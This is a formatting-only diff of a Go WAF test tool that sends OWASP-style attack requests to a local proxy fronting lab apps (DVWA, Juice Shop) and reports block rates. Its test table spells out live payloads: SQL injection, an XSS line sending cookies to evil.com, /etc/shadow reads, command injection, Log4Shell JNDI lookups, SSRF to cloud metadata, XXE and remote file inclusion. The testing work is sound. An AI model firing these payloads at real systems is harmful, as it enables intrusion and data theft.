@@ -508,39 +508,39 @@ type testCase struct {
 
 var owaspTests = []testCase{
 	// ── SQL Injection ────────────────────────────────────────────────────────
-	{name: "SQLi classic",         category: "SQLI",    method: "GET",  path: "/search",          query: "q=' OR '1'='1"},
-	{name: "SQLi UNION",           category: "SQLI",    method: "GET",  path: "/product",         query: "id=1 UNION SELECT username,password FROM users--"},
-	{name: "SQLi blind time",      category: "SQLI",    method: "GET",  path: "/user",            query: "id=1; WAITFOR DELAY '0:0:5'--"},
-	{name: "SQLi stacked",         category: "SQLI",    method: "POST", path: "/login",           body: `{"username":"admin'; DROP TABLE users;--","password":"x"}`},
+	{name: "SQLi classic", category: "SQLI", method: "GET", path: "/search", query: "q=' OR '1'='1"},
+	{name: "SQLi UNION", category: "SQLI", method: "GET", path: "/product", query: "id=1 UNION SELECT username,password FROM users--"},
+	{name: "SQLi blind time", category: "SQLI", method: "GET", path: "/user", query: "id=1; WAITFOR DELAY '0:0:5'--"},
+	{name: "SQLi stacked", category: "SQLI", method: "POST", path: "/login", body: `{"username":"admin'; DROP TABLE users;--","password":"x"}`},
 	// ── XSS ─────────────────────────────────────────────────────────────────
-	{name: "XSS reflected",        category: "XSS",     method: "GET",  path: "/search",          query: "q=<script>alert(document.cookie)</script>"},
-	{name: "XSS stored payload",   category: "XSS",     method: "POST", path: "/comment",         body: `{"body":"<img src=x onerror=alert(1)>"}`},
-	{name: "XSS DOM",              category: "XSS",     method: "GET",  path: "/profile",         query: "name=<svg onload=fetch('//evil.com?c='+document.cookie)>"},
+	{name: "XSS reflected", category: "XSS", method: "GET", path: "/search", query: "q=<script>alert(document.cookie)</script>"},
+	{name: "XSS stored payload", category: "XSS", method: "POST", path: "/comment", body: `{"body":"<img src=x onerror=alert(1)>"}`},
+	{name: "XSS DOM", category: "XSS", method: "GET", path: "/profile", query: "name=<svg onload=fetch('//evil.com?c='+document.cookie)>"},
 	// ── Path Traversal ───────────────────────────────────────────────────────
-	{name: "LFI /etc/passwd",      category: "LFI",     method: "GET",  path: "/file",            query: "path=../../../../etc/passwd"},
-	{name: "LFI null byte",        category: "LFI",     method: "GET",  path: "/download",        query: "file=../../etc/shadow%00.jpg"},
-	{name: "Directory traversal",  category: "LFI",     method: "GET",  path: "/../../../etc/passwd"},
+	{name: "LFI /etc/passwd", category: "LFI", method: "GET", path: "/file", query: "path=../../../../etc/passwd"},
+	{name: "LFI null byte", category: "LFI", method: "GET", path: "/download", query: "file=../../etc/shadow%00.jpg"},
+	{name: "Directory traversal", category: "LFI", method: "GET", path: "/../../../etc/passwd"},
 	// ── Command Injection ────────────────────────────────────────────────────
-	{name: "CMDi semicolon",       category: "CMDI",    method: "GET",  path: "/ping",            query: "host=localhost; cat /etc/passwd"},
-	{name: "CMDi backtick",        category: "CMDI",    method: "POST", path: "/api/exec",        body: `{"cmd":"ls `+"`id`"+`"}`},
-	{name: "CMDi dollar sub",      category: "CMDI",    method: "GET",  path: "/dns",             query: "domain=$(cat /etc/passwd)"},
+	{name: "CMDi semicolon", category: "CMDI", method: "GET", path: "/ping", query: "host=localhost; cat /etc/passwd"},
+	{name: "CMDi backtick", category: "CMDI", method: "POST", path: "/api/exec", body: `{"cmd":"ls ` + "`id`" + `"}`},
+	{name: "CMDi dollar sub", category: "CMDI", method: "GET", path: "/dns", query: "domain=$(cat /etc/passwd)"},
 	// ── Log4Shell ────────────────────────────────────────────────────────────
-	{name: "Log4Shell JNDI",       category: "RCE",     method: "GET",  path: "/api/v1/config",   headers: map[string]string{"X-Api-Version": "${jndi:ldap://evil.com:1389/a}"}},
-	{name: "Log4Shell User-Agent", category: "RCE",     method: "GET",  path: "/health",          headers: map[string]string{"User-Agent": "${jndi:rmi://attacker.com/exploit}"}},
+	{name: "Log4Shell JNDI", category: "RCE", method: "GET", path: "/api/v1/config", headers: map[string]string{"X-Api-Version": "${jndi:ldap://evil.com:1389/a}"}},
+	{name: "Log4Shell User-Agent", category: "RCE", method: "GET", path: "/health", headers: map[string]string{"User-Agent": "${jndi:rmi://attacker.com/exploit}"}},
 	// ── SSRF ─────────────────────────────────────────────────────────────────
-	{name: "SSRF localhost",       category: "SSRF",    method: "GET",  path: "/fetch",           query: "url=http://localhost:22/"},
-	{name: "SSRF metadata AWS",    category: "SSRF",    method: "GET",  path: "/proxy",           query: "url=http://169.254.169.254/latest/meta-data/"},
-	{name: "SSRF internal",        category: "SSRF",    method: "POST", path: "/webhook",         body: `{"url":"http://192.168.1.1/admin"}`},
+	{name: "SSRF localhost", category: "SSRF", method: "GET", path: "/fetch", query: "url=http://localhost:22/"},
+	{name: "SSRF metadata AWS", category: "SSRF", method: "GET", path: "/proxy", query: "url=http://169.254.169.254/latest/meta-data/"},
+	{name: "SSRF internal", category: "SSRF", method: "POST", path: "/webhook", body: `{"url":"http://192.168.1.1/admin"}`},
 	// ── XXE ──────────────────────────────────────────────────────────────────
-	{name: "XXE file read",        category: "XXE",     method: "POST", path: "/api/xml",         body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`, headers: map[string]string{"Content-Type": "application/xml"}},
+	{name: "XXE file read", category: "XXE", method: "POST", path: "/api/xml", body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`, headers: map[string]string{"Content-Type": "application/xml"}},
 	// ── Scanner UA ───────────────────────────────────────────────────────────
-	{name: "SQLMap scanner",       category: "SCANNER", method: "GET",  path: "/api/v1/users",    headers: map[string]string{"User-Agent": "sqlmap/1.8.2#stable (https://sqlmap.org)"}},
-	{name: "Nikto scanner",        category: "SCANNER", method: "GET",  path: "/cgi-bin/.%2e/.%2e/etc/passwd", headers: map[string]string{"User-Agent": "Nikto/2.1.6"}},
+	{name: "SQLMap scanner", category: "SCANNER", method: "GET", path: "/api/v1/users", headers: map[string]string{"User-Agent": "sqlmap/1.8.2#stable (https://sqlmap.org)"}},
+	{name: "Nikto scanner", category: "SCANNER", method: "GET", path: "/cgi-bin/.%2e/.%2e/etc/passwd", headers: map[string]string{"User-Agent": "Nikto/2.1.6"}},
 	// ── Prototype Pollution ───────────────────────────────────────────────────
-	{name: "Prototype pollution",  category: "NOSQLI",  method: "POST", path: "/api/merge",       body: `{"__proto__":{"admin":true}}`},
-	{name: "NoSQL injection",      category: "NOSQLI",  method: "POST", path: "/login",           body: `{"username":{"$gt":""},"password":{"$gt":""}}`},
+	{name: "Prototype pollution", category: "NOSQLI", method: "POST", path: "/api/merge", body: `{"__proto__":{"admin":true}}`},
+	{name: "NoSQL injection", category: "NOSQLI", method: "POST", path: "/login", body: `{"username":{"$gt":""},"password":{"$gt":""}}`},
 	// ── RFI ──────────────────────────────────────────────────────────────────
-	{name: "RFI HTTP",             category: "RFI",     method: "GET",  path: "/page",            query: "file=http://evil.com/shell.php"},
+	{name: "RFI HTTP", category: "RFI", method: "GET", path: "/page", query: "file=http://evil.com/shell.php"},
 }
 
 const (
@@ -555,19 +555,19 @@ const (
 
 func cmdTest(args []string) {
 	fs := flag.NewFlagSet("test", flag.ExitOnError)
-	target  := fs.String("target", "http://localhost:9080", "WAF proxy URL (e.g. http://localhost:9080)")
-	hostHdr := fs.String("host",   "dvwa.local",           "Host header to send with each request")
-	site    := fs.String("site",   "",                     "Shortcut: dvwa or juice")
-	delay   := fs.Int("delay",     120,                    "Milliseconds between requests")
+	target := fs.String("target", "http://localhost:9080", "WAF proxy URL (e.g. http://localhost:9080)")
+	hostHdr := fs.String("host", "dvwa.local", "Host header to send with each request")
+	site := fs.String("site", "", "Shortcut: dvwa or juice")
+	delay := fs.Int("delay", 120, "Milliseconds between requests")
 	fs.Parse(args)
 
 	// Apply site shortcut
 	switch *site {
 	case "dvwa":
-		*target  = "http://localhost:9080"
+		*target = "http://localhost:9080"
 		*hostHdr = "dvwa.local"
 	case "juice":
-		*target  = "http://localhost:9080"
+		*target = "http://localhost:9080"
 		*hostHdr = "juice.local"
 	}
 
@@ -618,8 +618,12 @@ func cmdTest(args []string) {
 
 		code := resp.StatusCode
 		rule := resp.Header.Get("X-Sentinel-Rule")
-		if rule == "" { rule = resp.Header.Get("X-Block-Rule") }
-		if rule == "" { rule = "-" }
+		if rule == "" {
+			rule = resp.Header.Get("X-Block-Rule")
+		}
+		if rule == "" {
+			rule = "-"
+		}
 
 		var verdict, clr string
 		switch {
@@ -647,7 +651,9 @@ func cmdTest(args []string) {
 	fmt.Printf("%s\n", strings.Repeat("─", 80))
 	total := len(owaspTests)
 	bRate := 0.0
-	if total > 0 { bRate = float64(blocked) / float64(total) * 100 }
+	if total > 0 {
+		bRate = float64(blocked) / float64(total) * 100
+	}
 	fmt.Printf("\n%sResults:%s  Total: %d  |  %sBlocked: %d (%.0f%%)%s  |  %sPassed: %d%s  |  Errors: %d\n\n",
 		colorBold, colorReset,
 		total,
